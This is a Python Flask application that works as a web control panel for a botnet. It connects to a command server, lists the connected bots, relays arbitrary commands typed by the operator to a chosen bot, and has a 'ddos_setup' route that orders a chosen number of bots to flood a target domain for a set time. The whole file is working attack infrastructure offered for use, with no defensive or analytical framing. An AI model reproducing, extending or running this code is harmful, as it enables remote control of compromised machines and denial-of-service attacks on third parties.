#!/usr/bin/env python

from flask import Flask, flash, redirect, render_template, request, session, abort, url_for
from socket import error
import socket
import os
import sys
import connection

app = Flask(__name__)
connection_err = 'Failed to connect to the server'
insert_err = 'Check if ip and port are correct'

@app.route('/')
def home():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    else:
        return redirect(url_for('main_activity'))
 
@app.route('/login', methods=['GET','POST'])
def login():
    if request.method == 'POST':
        server_ip = request.form.get('server_ip')
        server_port = request.form.get('server_port')
        if not server_ip or not server_port or int(server_port) not in range(1,65535):
            return render_template('login.html', error = insert_err)
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((server_ip, int(server_port)))
            sock.settimeout(None)
            session['logged_in'] = True
            session['ip'] = server_ip
            session['port'] = int(server_port)
            return redirect(url_for('main_activity'))
        except socket.timeout as err:
            print('[DEBUG] Timeout error | reason: %s' %(err))
            return render_template('login.html', error = connection_err)
        except error as serr:
            return render_template('login.html', error = connection_err)

    if request.method == 'GET':
        return render_template('login.html')

#This is the main activity page, it gets all bots connected to the main server
@app.route('/main_activity', methods=['GET','POST'])
def main_activity():
    if request.method == 'POST':
        if request.form['submit'] == 'DDOS':
            return redirect(url_for('ddos_setup'))
        else:
            req = request.form.get('access')
            print('[DEBUG] ip selected: %s' %(req))
            return redirect(url_for('peer_activity', ip = req))
    
    if request.method == 'GET':
        if not session.get('logged_in'):
            return redirect(url_for('login'))
        else:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((session.get('ip'), session.get('port')))
            try:
                sock.send("*".encode('utf-8'))
                ip_data = connection.recvTimeout(sock, timeout=1).split('*')
                session['cnt_peers'] = len(ip_data)
                print('[DEBUG] Bots connected %s' %str(ip_data), file=sys.stdout)
                sock.close()
                return render_template('main_activity.html', ip_list = ip_data)
            except socket.timeout as err:
                sock.close()
                return render_template('main_activity.html')
        
#User activity, get information from the bot you are connected
@app.route('/peer_activity/<ip>', methods=['GET','POST'])
def peer_activity(ip):
    if request.method == 'POST':
        if request.form['submit'] == 'Send':
            cmd = request.form.get('cmd_text')
            host = request.form.get("host")
            if cmd == '':
                return render_template('peer_activity.html', ip = ip)
            server_ip = session.get('ip')
            server_port = session.get('port')
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((server_ip, server_port))
            srv_msg = "*".join(['CMD', host, cmd])
            sock.send(srv_msg.encode('utf-8'))
            print("[DEBUG] Message to server [%s] | PEER [%s]" %(srv_msg, host))
            resp = connection.recvTimeout(sock, 8)
            sock.close()
            #TODO Check  resp format
            if resp:
                print("[DEBUG] Response from Server: %s" %resp)
                return render_template('peer_activity.html', ip = ip, cmd_response = resp)
            else:
                return render_template('peer_activity.html', ip = ip)

        elif request.form['submit'] == 'Back':
            return redirect(url_for('main_activity'))

    elif request.method == 'GET':
        if session.get('logged_in') == True:
            return render_template('peer_activity.html', ip = ip)
        else:
            return redirect(url_for('login'))

#ddos_setup, setup for a ddos attack
@app.route('/ddos_setup', methods=['GET','POST'])
def ddos_setup():
    if request.method == 'POST':
        if request.form['submit'] == 'Start':
            n_peers = request.form.get('range')
            time = request.form.get('time')
            host = request.form.get('domain')
            if ('http' or 'https') in host:
                host = host.split('/')[2]
            msg = '*'.join(['DDOS', n_peers, time, host])
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((session.get('ip'), session.get('port')))
            sock.send(msg.encode('utf-8'))
            srv_rsp = connection.recvTimeout(sock, 2)
            sock.close()
            if srv_rsp:
                return render_template('ddos_setup.html', n_peers = session.get('cnt_peers'), response = srv_rsp)
            else:
                return render_template('ddos_setup.html', n_peers = session.get('cnt_peers'))
        elif request.form['submit'] == 'Back':
            return redirect(url_for('main_activity'))

    elif request.method == 'GET':
        if session.get('logged_in') == True:
            return render_template('ddos_setup.html', n_peers = session.get('cnt_peers'))
        else: 
            return redirect(url_for('login'))

if __name__ == "__main__":
    app.secret_key = os.urandom(12)
    app.debug=True
    app.run('0.0.0.0')
